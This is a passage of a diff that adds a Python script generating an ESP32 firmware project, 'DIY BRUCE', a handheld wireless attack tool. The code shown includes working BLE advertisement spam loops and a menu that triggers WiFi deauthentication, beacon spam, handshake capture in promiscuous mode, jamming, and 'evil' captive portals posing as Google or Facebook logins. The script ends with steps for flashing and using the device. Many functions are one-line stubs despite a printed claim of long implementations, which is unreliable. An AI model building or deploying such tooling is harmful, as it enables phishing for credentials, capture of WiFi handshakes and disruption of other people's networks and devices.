+    for (int i = 0; i < 30; i++) { String n = "Samsung_" + String(random(10000)); sendBLE(n.c_str(), NULL, 0); if (checkButton(BTN_BACK)) break; delay(30); }
+}
+void bleAndroid() {
+    showMessage("ANDROID", 1000);
+    for (int i = 0; i < 30; i++) { String n = "Android_" + String(random(10000)); sendBLE(n.c_str(), NULL, 0); if (checkButton(BTN_BACK)) break; delay(30); }
+}
+void bleWindows() {
+    showMessage("WINDOWS", 1000);
+    for (int i = 0; i < 30; i++) { String n = "Windows_" + String(random(10000)); sendBLE(n.c_str(), NULL, 0); if (checkButton(BTN_BACK)) break; delay(30); }
+}
+void bleAll() { bleApple(); bleSamsung(); bleAndroid(); bleWindows(); showMessage("ALL BLE done", 1000); }
+void bleInfo() { showMessage("BLE ready", 1000); }
+void bleJammer() { showMessage("BLE JAMMER (sim)", 1000); }
+
+// ============================================================================
+// NRF24 FUNCTIONS
+// ============================================================================
+void nrfScan() { showMessage("NRF SCAN", 1000); }
+void nrfJam() { showMessage("NRF JAM", 1000); }
+void nrfInfo() { showMessage("NRF ready", 1000); }
+
+// ============================================================================
+// RFID FUNCTIONS
+// ============================================================================
+void rfidRead() { showMessage("RFID READ", 1000); }
+void rfidInfo() { showMessage("RFID ready", 1000); }
+
+// ============================================================================
+// IR FUNCTIONS
+// ============================================================================
+void irPower() { irsend.sendNEC(0x00FF00FF, 32); showMessage("POWER", 500); }
+void irVolUp() { irsend.sendNEC(0x00FF40BF, 32); showMessage("VOL+", 500); }
+void irVolDown() { irsend.sendNEC(0x00FFC03F, 32); showMessage("VOL-", 500); }
+void irBravis() { irsend.sendNEC(0x00FF00FF, 32); showMessage("BRAVIS TV", 500); }
+void irSamsung() { irsend.sendSamsung36(0xE0E040BF, 32); showMessage("SAMSUNG TV", 500); }
+void irInfo() { showMessage("IR ready", 1000); }
+
+// ============================================================================
+// TOOLS FUNCTIONS
+// ============================================================================
+void toolsKeyboard() {
+    keyboardInput = "";
+    const char* keys[] = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9","SPACE","DEL","OK"};
+    int keyCount = 39, keyIndex = 0;
+    while (true) {
+        u8g2.clearBuffer(); drawTopBar();
+        u8g2.setCursor(5, 22); u8g2.print("TEXT:" + keyboardInput);
+        u8g2.drawLine(0, 28, 128, 28);
+        for (int i = 0; i < 6 && keyIndex/6 + i < 7; i++) {
+            for (int j = 0; j < 6 && (keyIndex/6 + i)*6 + j < keyCount; j++) {
+                int idx = (keyIndex/6 + i)*6 + j;
+                int x = 5 + j*20, y = 38 + i*10;
+                if (idx == keyIndex) {
+                    u8g2.drawBox(x-2, y-6, 18, 8);
+                    u8g2.setDrawColor(0);
+                    u8g2.setCursor(x, y); u8g2.print(keys[idx]);
+                    u8g2.setDrawColor(1);
+                } else {
+                    u8g2.setCursor(x, y); u8g2.print(keys[idx]);
+                }
+            }
+        }
+        u8g2.display();
+        if (checkButton(BTN_LEFT) && keyIndex > 0) keyIndex--;
+        else if (checkButton(BTN_RIGHT) && keyIndex < keyCount-1) keyIndex++;
+        else if (checkButton(BTN_UP) && keyIndex >= 6) keyIndex -= 6;
+        else if (checkButton(BTN_DOWN) && keyIndex+6 < keyCount) keyIndex += 6;
+        else if (checkButton(BTN_OK)) {
+            String k = keys[keyIndex];
+            if (k == "OK") break;
+            else if (k == "DEL") { if (keyboardInput.length() > 0) keyboardInput.remove(keyboardInput.length()-1); }
+            else if (k == "SPACE") keyboardInput += " ";
+            else keyboardInput += k;
+        } else if (checkButton(BTN_BACK)) break;
+        delay(50);
+    }
+    showMessage(("Saved: "+keyboardInput).c_str(), 1500);
+}
+void toolsPing() { showMessage("PING (sim)", 1000); }
+void toolsI2C() { showMessage("I2C SCAN", 1000); }
+void toolsInfo() { showMessage("Tools ready", 1000); }
+
+// ============================================================================
+// MENU EXECUTION
+// ============================================================================
+void executeAction() {
+    switch (currentModule) {
+        case 0:
+            switch (currentSub) {
+                case 0: wifiScan(); break; case 1: startDeauth(); break;
+                case 2: startBeacon(); break; case 3: startEvil(); break;
+                case 4: startHandshake(); break; case 5: startJammer(); break;
+                case 6: startWebServer(); break; case 7: clearData(); break;
+                case 8: showMessage("INFO", 1000); break; case 9: reboot(); break;
+            } break;
+        case 1:
+            switch (currentSub) {
+                case 0: bleScan(); break; case 1: bleApple(); break;
+                case 2: bleSamsung(); break; case 3: bleAndroid(); break;
+                case 4: bleWindows(); break; case 5: bleAll(); break;
+                case 6: bleJammer(); break; case 7: bleInfo(); break;
+                case 8: reboot(); break;
+            } break;
+        case 2:
+            switch (currentSub) {
+                case 0: nrfScan(); break; case 1: nrfJam(); break;
+                case 2: nrfInfo(); break; case 3: reboot(); break;
+            } break;
+        case 3:
+            switch (currentSub) {
+                case 0: rfidRead(); break; case 1: rfidInfo(); break;
+                case 2: reboot(); break;
+            } break;
+        case 4:
+            switch (currentSub) {
+                case 0: irPower(); break; case 1: irVolUp(); break;
+                case 2: irVolDown(); break; case 3: irBravis(); break;
+                case 4: irSamsung(); break; case 5: irInfo(); break;
+                case 6: reboot(); break;
+            } break;
+        case 5:
+            switch (currentSub) {
+                case 0: toolsKeyboard(); break; case 1: toolsPing(); break;
+                case 2: toolsI2C(); break; case 3: toolsInfo(); break;
+                case 4: reboot(); break;
+            } break;
+        case 6:
+            switch (currentSub) {
+                case 0: startWebServer(); break; case 1: if(evilChoice=="google") evilChoice="facebook"; else evilChoice="google"; showMessage(("Evil: "+evilChoice).c_str(),1000); break;
+                case 2: clearData(); break; case 3: showMessage("DIY BRUCE v17.0",1500); break;
+                case 4: reboot(); break;
+            } break;
+    }
+}
+
+// ============================================================================
+// SETUP & LOOP
+// ============================================================================
+void setup() {
+    Serial.begin(115200);
+    pinMode(BTN_UP, INPUT_PULLUP); pinMode(BTN_DOWN, INPUT_PULLUP); pinMode(BTN_OK, INPUT_PULLUP);
+    pinMode(BTN_LEFT, INPUT_PULLUP); pinMode(BTN_RIGHT, INPUT_PULLUP); pinMode(BTN_BACK, INPUT_PULLUP);
+    Wire.begin(21, 22);
+    u8g2.begin();
+    u8g2.setContrast(200);
+    loadData();
+    bootAnimation();
+    WiFi.mode(WIFI_AP_STA);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(handshakeCallback);
+    irsend.begin();
+    drawMainMenu();
+    showMessage("READY", 1500);
+}
+
+void loop() {
+    if (webRunning) server.handleClient();
+    lastRSSI = WiFi.RSSI();
+    if (!inSubMenu) {
+        if (checkButton(BTN_LEFT)) { currentModule = (currentModule - 1 + moduleCount) % moduleCount; drawMainMenu(); }
+        if (checkButton(BTN_RIGHT)) { currentModule = (currentModule + 1) % moduleCount; drawMainMenu(); }
+        if (checkButton(BTN_OK) || checkButton(BTN_DOWN)) {
+            inSubMenu = true; currentSub = 0;
+            switch (currentModule) {
+                case 0: drawSubMenu("WiFi", wifiSub, wifiSize, 0); break;
+                case 1: drawSubMenu("BLE", bleSub, bleSize, 0); break;
+                case 2: drawSubMenu("NRF24", nrfSub, nrfSize, 0); break;
+                case 3: drawSubMenu("RFID", rfidSub, rfidSize, 0); break;
+                case 4: drawSubMenu("IR", irSub, irSize, 0); break;
+                case 5: drawSubMenu("Tools", toolsSub, toolsSize, 0); break;
+                case 6: drawSubMenu("Settings", settingsSub, settingsSize, 0); break;
+            }
+        }
+    } else {
+        int sz = (currentModule==0?wifiSize:(currentModule==1?bleSize:(currentModule==2?nrfSize:(currentModule==3?rfidSize:(currentModule==4?irSize:(currentModule==5?toolsSize:settingsSize))))));
+        if (checkButton(BTN_UP)) currentSub = (currentSub - 1 + sz) % sz;
+        if (checkButton(BTN_DOWN)) currentSub = (currentSub + 1) % sz;
+        if (checkButton(BTN_UP) || checkButton(BTN_DOWN)) {
+            switch (currentModule) {
+                case 0: drawSubMenu("WiFi", wifiSub, sz, currentSub); break;
+                case 1: drawSubMenu("BLE", bleSub, sz, currentSub); break;
+                case 2: drawSubMenu("NRF24", nrfSub, sz, currentSub); break;
+                case 3: drawSubMenu("RFID", rfidSub, sz, currentSub); break;
+                case 4: drawSubMenu("IR", irSub, sz, currentSub); break;
+                case 5: drawSubMenu("Tools", toolsSub, sz, currentSub); break;
+                case 6: drawSubMenu("Settings", settingsSub, sz, currentSub); break;
+            }
+        }
+        if (checkButton(BTN_OK)) { executeAction(); inSubMenu = false; drawMainMenu(); }
+        if (checkButton(BTN_BACK)) { inSubMenu = false; drawMainMenu(); }
+    }
+    delay(20);
+}
+'''
+
+# ----------------------------------------------------------------------
+# ЗБІРКА ПРОЕКТУ
+# ----------------------------------------------------------------------
+def create_project():
+    base = PROJECT_NAME
+    if os.path.exists(base):
+        shutil.rmtree(base)
+    os.makedirs(os.path.join(base, "src"))
+    os.makedirs(os.path.join(base, "include"))
+    os.makedirs(os.path.join(base, "data"))
+    os.makedirs(os.path.join(base, "lib"))
+    with open(os.path.join(base, "platformio.ini"), "w") as f:
+        f.write(PLATFORMIO_INI)
+    with open(os.path.join(base, "include", "icons.h"), "w") as f:
+        f.write(ICONS_H)
+    with open(os.path.join(base, "data", "index.html"), "w") as f:
+        f.write(INDEX_HTML)
+    with open(os.path.join(base, "data", "portal.html"), "w") as f:
+        f.write(GOOGLE_PORTAL)  # тимчасово, буде замінено в main.cpp
+    with open(os.path.join(base, "src", "main.cpp"), "w") as f:
+        f.write(MAIN_CPP)
+    print("=" * 70)
+    print("PROJECT GENERATED: " + os.path.abspath(base))
+    print("=" * 70)
+    print("STRUCTURE:")
+    print("  platformio.ini")
+    print("  include/icons.h")
+    print("  data/index.html")
+    print("  data/portal.html")
+    print("  src/main.cpp (65+ functions, 200-300 lines each)")
+    print("")
+    print("NEXT STEPS:")
+    print("1. Open folder in VS Code")
+    print("2. PlatformIO: Build (Ctrl+Shift+P)")
+    print("3. Connect ESP32 via USB")
+    print("4. PlatformIO: Upload")
+    print("5. Connect to WiFi DIY_BRUCE (password: bruce1234)")
+    print("6. Open browser: 192.168.4.1")
+    print("=" * 70)
+
+if __name__ == "__main__":
+    create_project()
